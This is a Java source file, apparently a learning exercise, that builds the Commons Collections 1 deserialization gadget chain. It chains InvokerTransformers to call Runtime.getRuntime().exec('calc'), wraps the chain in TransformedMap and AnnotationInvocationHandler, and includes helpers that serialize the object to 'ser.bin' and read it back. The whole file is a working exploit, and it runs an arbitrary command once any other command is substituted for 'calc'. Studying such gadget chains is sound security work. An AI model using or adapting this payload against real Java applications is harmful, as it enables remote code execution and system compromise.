package com.mechoy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.AbstractBagDecorator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/23
 */
public class CC1 {
    public static String path = "ser.bin";
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","kkk");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, (Transformer) chainedTransformer);
        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);
//        serialize(o);
        deserialize();
//
//
//        for (Map.Entry entry : decorate.entrySet()) {
//            entry.setValue(Runtime.getRuntime());
//        }
        // 增强for循环看不懂可以看下面
//        Set<Map.Entry<Object, Object>> entries = decorate.entrySet();
//        Iterator<Map.Entry<Object, Object>> iterator1 = entries.iterator();
//        Map.Entry<Object, Object> next = iterator1.next();
//        next.setValue(Runtime.getRuntime());

//        for (Iterator<Map.Entry<Object, Object>> iterator = decorate.entrySet().iterator(); iterator.hasNext();) {
//            Map.Entry<Object, Object> entry = iterator.next();
//            entry.setValue(Runtime.getRuntime());
//        }
    }
    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
